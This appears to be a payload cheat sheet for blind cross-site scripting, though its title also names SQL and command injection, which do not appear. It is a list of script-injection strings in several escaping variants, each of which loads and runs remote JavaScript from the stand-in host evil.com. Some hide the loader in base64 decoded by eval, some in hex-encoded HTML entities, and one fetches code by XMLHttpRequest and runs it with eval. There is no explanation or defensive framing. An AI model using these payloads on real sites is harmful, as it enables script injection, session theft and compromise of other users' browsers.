# Blind XSS, SQLi, CMDi

## Blind XSS

```html
<script/src=//evil.com>
<script src=https://evil.com></script>
javascript:eval("var a=document.createElement('script');a.src='https://evil.com';document.body.appendChild(a)")
<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
<svg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
<video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
<iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x28;&#x22;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x29;&#x3b;&#x61;&#x2e;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3b;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x61;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x43;&#x68;&#x69;&#x6c;&#x64;&#x28;&#x61;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//evil.com");a.send();</script>
<script>$.getScript("//evil.com")</script>
"><script/src=//evil.com>
"><script src=https://evil.com></script>
">javascript:eval("var a=document.createElement('script');a.src='https://evil.com';document.body.appendChild(a)")
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"><svg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
"><iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x28;&#x22;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x29;&#x3b;&#x61;&#x2e;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3b;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x61;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x43;&#x68;&#x69;&#x6c;&#x64;&#x28;&#x61;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//evil.com");a.send();</script>
"><script>$.getScript("//evil.com")</script>
"-->'><script/src=//evil.com>
"-->'><script src=https://evil.com></script>
"-->'>javascript:eval("var a=document.createElement('script');a.src='https://evil.com';document.body.appendChild(a)")
"-->'><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
"-->'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"-->'><svg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"-->'><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
"-->'><iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x28;&#x22;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x29;&#x3b;&#x61;&#x2e;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3b;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x61;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x43;&#x68;&#x69;&#x6c;&#x64;&#x28;&#x61;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
"-->'><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//evil.com");a.send();</script>
"-->'><script>$.getScript("//evil.com")</script>
```
